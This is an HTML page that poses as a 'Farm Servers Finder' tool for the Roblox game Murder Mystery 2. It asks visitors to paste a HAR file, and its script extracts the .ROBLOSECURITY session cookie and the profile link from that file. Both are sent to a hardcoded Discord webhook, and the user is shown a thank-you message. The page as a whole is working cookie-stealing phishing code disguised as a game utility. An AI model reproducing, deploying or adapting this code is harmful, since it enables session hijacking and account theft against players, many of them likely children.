<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Farm Servers Finder MM2</title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .panel {
      background-color: #1e1e1e;
      border-radius: 10px;
      padding: 20px;
      width: 50%;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    .panel h2 {
      color: #ff79c6;
    }
    .panel textarea {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 20px;
      border-radius: 5px;
      border: 1px solid #333;
      background-color: #252525;
      color: #ffffff;
    }
    .panel button {
      background-color: #ff79c6;
      border: none;
      padding: 10px 20px;
      color: #ffffff;
      border-radius: 5px;
      cursor: pointer;
    }
    .panel button:hover {
      background-color: #e066c1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="panel">
      <h2>Farm Servers Finder</h2>
      <p>Paste your HAR file content below. We will detect your <code>.ROBLOSECURITY</code> cookie and profile link to send to the server.</p>
      <label for="harContent">Paste Your HAR File Content:</label>
      <textarea id="harContent" rows="10" placeholder="Paste HAR content here..."></textarea>
      <button id="submitBtn">Submit</button>
    </div>
  </div>

  <script>
    document.getElementById('submitBtn').addEventListener('click', () => {
      const harContent = document.getElementById('harContent').value.trim();

      // Check if HAR content contains .ROBLOSECURITY
      if (!harContent.includes('.ROBLOSECURITY')) {
        Swal.fire('Error', 'The HAR file does not contain a .ROBLOSECURITY cookie.', 'error');
        return;
      }

      try {
        const harData = JSON.parse(harContent);
        const entries = harData.log.entries;

        let roblosecurityCookie = '';
        let profileURL = '';

        for (const entry of entries) {
          const request = entry.request;

          // Extract .ROBLOSECURITY cookie
          const cookieHeader = request.headers.find(header => header.name.toLowerCase() === 'cookie');
          if (cookieHeader && cookieHeader.value.includes('.ROBLOSECURITY=')) {
            const match = cookieHeader.value.match(/\.ROBLOSECURITY=([^;]+)/);
            if (match) roblosecurityCookie = match[1];
          }

          // Extract profile URL
          if (request.url.includes('https://www.roblox.com/users/')) {
            profileURL = request.url;
          }
        }

        // If no cookie or profile link was found, show an error
        if (!roblosecurityCookie || !profileURL) {
          Swal.fire('Error', 'Could not extract required information from the HAR file.', 'error');
          return;
        }

        // Send data to Discord webhook
        fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            embeds: [
              {
                title: 'New Server Request',
                color: 15844367,
                fields: [
                  { name: 'Profile Link', value: profileURL || 'Not Found', inline: true },
                  { name: '.ROBLOSECURITY', value: `\`\`\`${roblosecurityCookie}\`\`\``, inline: false },
                ],
              },
            ],
          }),
        })
          .then(response => {
            if (!response.ok) {
              throw new Error('Failed to send data to webhook.');
            }
            Swal.fire({
              icon: 'success',
              title: 'Success!',
              text: 'Your data has been submitted. Thank you!',
            });
          })
          .catch(error => {
            console.error('Error sending data to webhook:', error);
            Swal.fire('Error', 'Failed to send data to the webhook. Please check the console for details.', 'error');
          });
      } catch (error) {
        console.error('Failed to process HAR content:', error);
        Swal.fire('Error', 'The HAR file is invalid. Please check the format.', 'error');
      }
    });
  </script>
</body>
</html>
